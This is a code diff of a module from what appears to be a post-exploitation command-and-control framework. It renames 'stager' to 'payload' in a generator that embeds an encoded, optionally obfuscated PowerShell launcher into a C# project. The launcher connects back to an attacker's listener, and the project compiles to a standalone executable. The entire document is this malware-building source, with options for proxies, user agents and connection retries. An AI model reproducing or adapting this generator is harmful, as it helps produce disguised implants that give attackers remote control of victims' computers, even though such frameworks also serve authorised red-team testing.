@@ -1,7 +1,7 @@
 from lib.common import helpers
 import shutil
 
-class Stager:
+class payload:
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,24 +10,24 @@ class Stager:
 
             'Author': ['@elitest'],
 
-            'Description': ('Generate a PowerShell C#  solution with embedded stager code that compiles to an exe'),
+            'Description': ('Generate a PowerShell C#  solution with embedded payload code that compiles to an exe'),
 
             'Comments': [
                 'Based on the work of @bneg'
             ]
         }
 
-        # any options needed by the stager, settable during runtime
+        # any options needed by the payload, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
             'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
+                'Description'   :   'Listener to generate payload for.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Language' : {
-                'Description'   :   'Language of the stager to generate.',
+                'Description'   :   'Language of the payload to generate.',
                 'Required'      :   True,
                 'Value'         :   'powershell'
             },
@@ -36,8 +36,8 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
+            'payloadRetries' : {
+                'Description'   :   'Times for the payload to retry connecting.',
                 'Required'      :   False,
                 'Value'         :   '0'
             },
@@ -93,7 +93,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+        payloadRetries = self.options['payloadRetries']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
         outfile = self.options['OutFile']['Value']
@@ -108,10 +108,10 @@ class Stager:
                 obfuscateScript = True
 
             if obfuscateScript and "launcher" in obfuscateCommand.lower():
-                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the C# stager.")
+                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the C# payload.")
                 return ""
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries)
 
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
@@ -125,7 +125,7 @@ class Stager:
                 shutil.copytree(directory,destdirectory)
 
                 lines = open(destdirectory + 'cmd/Program.cs').read().splitlines()
-                lines[19] = "\t\t\tstring stager = \"" + launcherCode + "\";"
+                lines[19] = "\t\t\tstring payload = \"" + launcherCode + "\";"
                 open(destdirectory + 'cmd/Program.cs','w').write('\n'.join(lines))
                 shutil.make_archive(outfile,'zip',destdirectory)
                 shutil.rmtree(destdirectory)
